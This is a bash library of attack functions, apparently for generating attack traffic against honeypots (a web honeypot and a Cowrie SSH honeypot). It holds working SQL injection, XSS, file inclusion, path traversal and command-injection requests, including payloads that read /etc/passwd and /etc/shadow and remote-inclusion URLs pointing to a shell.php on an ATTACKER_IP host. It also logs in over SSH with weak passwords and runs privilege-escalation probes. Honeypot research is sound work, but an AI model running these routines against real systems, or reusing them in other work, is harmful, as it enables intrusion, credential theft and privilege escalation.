#!/bin/bash
# lib/tactics_intrusion.sh - 침투 전술 함수

tactic_sqli_manual() {
    local n=$(rand_int 5 12)
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    for i in $(seq 1 $n); do
        local payload
        payload=$(rand_pick "${SQLI_POOL[@]}")
        local encoded
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
        curl -s --max-time 5 -A "$ua" \
            "http://${SNARE_IP}:8080/?id=${encoded}" -o /dev/null 2>/dev/null || true
        curl -s --max-time 5 -A "$ua" -X POST \
            "http://${SNARE_IP}:8080/login" \
            -d "username=${payload}&password=anything" -o /dev/null 2>/dev/null || true
        rand_sleep 0 1
    done
}

tactic_sqli_sqlmap() {
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    local level=$(rand_int 1 3)
    local risk=$(rand_int 1 2)
    sqlmap -u "http://${SNARE_IP}:8080/?id=1" \
        --batch --level=$level --risk=$risk \
        --output-dir=/honeypot_logs/sqlmap_out \
        --random-agent --timeout=8 \
        2>/dev/null || true
}

tactic_xss() {
    local n=$(rand_int 4 10)
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    for i in $(seq 1 $n); do
        local payload
        payload=$(rand_pick "${XSS_POOL[@]}")
        local path
        path=$(rand_pick "/" "/search" "/comment" "/feedback" "/profile")
        curl -s --max-time 5 -A "$ua" \
            "http://${SNARE_IP}:8080${path}?q=${payload}" -o /dev/null 2>/dev/null || true
        curl -s --max-time 5 -A "$ua" -X POST \
            "http://${SNARE_IP}:8080${path}" \
            -d "input=${payload}&submit=1" -o /dev/null 2>/dev/null || true
    done
}

tactic_lfi() {
    local n=$(rand_int 4 10)
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    for i in $(seq 1 $n); do
        local payload
        payload=$(rand_pick "${LFI_POOL[@]}")
        local param
        param=$(rand_pick "page" "file" "include" "path" "doc" "template")
        curl -s --max-time 5 -A "$ua" \
            "http://${SNARE_IP}:8080/?${param}=${payload}" -o /dev/null 2>/dev/null || true
        curl -s --max-time 5 -A "$ua" \
            "http://${SNARE_IP}:8080/${payload}" -o /dev/null 2>/dev/null || true
    done
}

tactic_web_scanner() {
    local ua
    ua=$(rand_pick "Nikto/2.1.6" "WPScan v3.8.22" "Dirbuster/1.0-RC1" "w3af/2.0")
    local n=$(rand_int 8 20)
    for path in $(printf '%s\n' "${WEB_PATH_POOL[@]}" | shuf | head -n $n); do
        curl -s --max-time 3 -A "$ua" \
            "http://${SNARE_IP}:8080${path}" -o /dev/null 2>/dev/null || true
    done
}

tactic_path_traversal() {
    local n=$(rand_int 5 10)
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    local traversals=(
        "/../../../etc/passwd" "/../../windows/system.ini"
        "/%2e%2e/%2e%2e/etc/passwd" "/..%2F..%2Fetc%2Fshadow"
        "/.%252e/.%252e/etc/hosts" "/....//....//etc/passwd"
    )
    for i in $(seq 1 $n); do
        local t
        t=$(rand_pick "${traversals[@]}")
        curl -s --max-time 3 -A "$ua" \
            "http://${SNARE_IP}:8080${t}" -o /dev/null 2>/dev/null || true
    done
}

tactic_rfi() {
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    local params=("page" "file" "include" "url" "src")
    local payloads=(
        "http://${ATTACKER_IP}:8888/shell.php"
        "http://${ATTACKER_IP}:8888/malicious.txt"
        "ftp://${ATTACKER_IP}/payload.php"
    )
    local n=$(rand_int 3 6)
    for i in $(seq 1 $n); do
        local param
        param=$(rand_pick "${params[@]}")
        local payload
        payload=$(rand_pick "${payloads[@]}")
        curl -s --max-time 3 -A "$ua" \
            "http://${SNARE_IP}:8080/?${param}=${payload}" -o /dev/null 2>/dev/null || true
    done
}

tactic_cmd_injection() {
    local ua
    ua=$(rand_pick "${UA_POOL[@]}")
    local payloads=(
        "; id" "| whoami" "\`id\`" "; cat /etc/passwd"
        "& dir" "| net user" "; ls -la"
        "%3B+id" "%7C+whoami" "%26%26+id"
    )
    local n=$(rand_int 4 8)
    for i in $(seq 1 $n); do
        local payload
        payload=$(rand_pick "${payloads[@]}")
        curl -s --max-time 3 -A "$ua" \
            "http://${SNARE_IP}:8080/ping?host=127.0.0.1${payload}" -o /dev/null 2>/dev/null || true
        curl -s --max-time 3 -A "$ua" -X POST \
            "http://${SNARE_IP}:8080/exec" \
            -d "cmd=${payload}" -o /dev/null 2>/dev/null || true
    done
}

tactic_ssh_post_intrusion() {
    local user
    user=$(rand_pick "root" "admin" "pi" "ubuntu" "user")
    local pass
    pass=$(rand_pick "${PASS_POOL[@]:0:10}")  # 알려진 약한 패스워드 먼저

    # 랜덤 명령어 서브셋 실행
    local n=$(rand_int 8 20)
    local cmds
    mapfile -t cmds < <(printf '%s\n' "${POST_INTRUSION_POOL[@]}" | shuf | head -n $n)

    local cmd_str
    cmd_str=$(printf '%s\n' "${cmds[@]}")

    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} \
        bash -s <<< "$cmd_str" 2>/dev/null || true
}

tactic_ssh_privilege_escalation() {
    local user
    user=$(rand_pick "pi" "ubuntu" "user" "guest")
    local pass
    pass=$(rand_pick "${PASS_POOL[@]:0:8}")

    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} << 'ENDSSH' 2>/dev/null || true
sudo -l
sudo su -
su - root
find / -perm -4000 -type f 2>/dev/null
ls -la /etc/sudoers /etc/sudoers.d/
cat /etc/sudoers 2>/dev/null
ENDSSH
}
